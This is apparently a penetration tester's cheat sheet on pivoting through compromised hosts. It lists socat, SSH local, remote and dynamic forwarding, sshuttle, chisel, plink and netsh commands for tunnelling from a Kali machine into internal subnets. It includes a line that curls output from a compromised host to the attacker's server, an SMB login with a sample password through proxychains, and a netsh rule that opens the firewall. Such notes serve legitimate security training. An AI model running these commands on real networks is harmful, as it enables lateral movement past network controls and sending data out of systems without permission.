### Socat
`socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22`

### SSH
Local  
> case A: access to a port only open on the compromised host
> 	link  local port to port of target host
>> `ssh -L lport:localhost:rport  username@compromisedIP`
>
> case B:  access to a port on 3rd host with the same subdomain network of compromised host
> 		link local port to 3rd target host port
> > `ssh -L localhost:lport:3rdhostIP:rport username@compromisedIP`
> >
> case C: Host A (kali) → Host B (you own and run ssh -L) → Host C (where the SSH connection authenticates) → Host D: (the target).
> > `ssh -N -L 0.0.0.0:xxxx:<host_d_ip>:xxx <user>@<host_c_ip>` // run in host b

Dynamic
```
//use socks5 to forward multyple ports, but for some applications needs proxychain4.
Host A (kali) → Host B (you own and run ssh -L) → Host C (where the SSH connection authenticates) → Host D: (the target)

ssh -N -D 0.0.0.0:9999 user@hostc  //run on hostb

//add this into /etc/proxychains4 in kali
socks5 hostb port

proxychains smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234   //in kali,, also lie nmap
```

Remote
//use in kali as the target host's port is reachable locally 
> case A: let compromised host access to a remote port, localhost is able to visit, but  compromised host cannot, in another word, this port only open for localhost
> > `ssh -R:port(compromised):localhost:port(target) username@compromisedIP`
> 
>  case B:  verse vesa, 
>  > `ssh -N -R 127.0.0.1:kali_port:targetIP(host_c):target_port kali@kali_IP`
//for remote dynamic, change /etc/proxychain4
>  > socks5 127.0.0.1 port
>  >

#### sshuttle
it requires root privileges on the SSH client and Python3 on the SSH server
kali owns host_a, host port FortW to host_b port 22
```
//on host b, set port Forw
socat TCP-LISTEN:2222,fork TCP:host_c:22

//specifying the SSH connection string we want to use, as well as the subnets that we want to tunnel through this connection (10.4.50.0/24 and 172.16.50.0/24)

`kali@kali:~$ sshuttle -r database_admin@host_b:2222 10.4.50.0/24 172.16.50.0/24`
```

### Chisel
- A: let compromised host access to a remote port, localhost is able to visit, but  compromised host cannot, in another word, this port only open for localhost
 server set on localhost, this listening IP is used for create tunnel <br>
> on compromised host:<br>
> `chisel server -p xxx`<br>
> on local host: <br>
> `chisel client serverIP:port(server listening) port(local host):target domainname(rIP):rport`<br>
>  Access: `curl http://localhost:port(on compromised)`

- B: localhost access a port open in the subnetwork where compromised host sits<br>
>  server also set on localhost, this listening IP is used for create tunnel:<br>
>	`chisel server -p xxx --reverse`<br>
> on compromised host:<br>
>	`chisel client localhostIP:port(you are listening) R:port(localhost):3edhostIP:port(3rd)`<br>  if the 3rdhost is the compromised one, set it as 127.0.0.1
>
> on localhost, access to port 3rd:<br>
>	`curl http://localhost:port(localhost)`
- C:
//Assuming, the compromised host_b only port 80 is available, use chisel to proxy all traffic through this port, this case , lets ssh to host_c

```
kali@kali:~$ chisel server --port 8080 --reverse

//in host_b,compromised; connect server and output all into the server port

chisel client kali_IP:8080 R:socks &> /tmp/output; curl --data @/tmp/output http://kali:8080/

//use ncat to force traffic, and the proxy will go port 1080 not 8080, if you use 'ss', you will see it listening

ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' host_c  user@host_c
```


### For Win
##### SSH
`ssh -N -R port_listening uaerofkali@Kali_IP`
We can also use remote port Forw

##### plink
remote port Forw, 
`plink.exe -ssh -l kali_user -pw <YOUR PASSWORD HERE> -R 127.0.0.1:9833:127.0.0.1:target_port Kali_IP`

##### Netsh
require administrative priv

`netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.50.64 connectport=22 connectaddress=10.4.50.215`

//if the ports are not allowed by FW

`netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=192.168.50.64 localport=2222 action=allow`
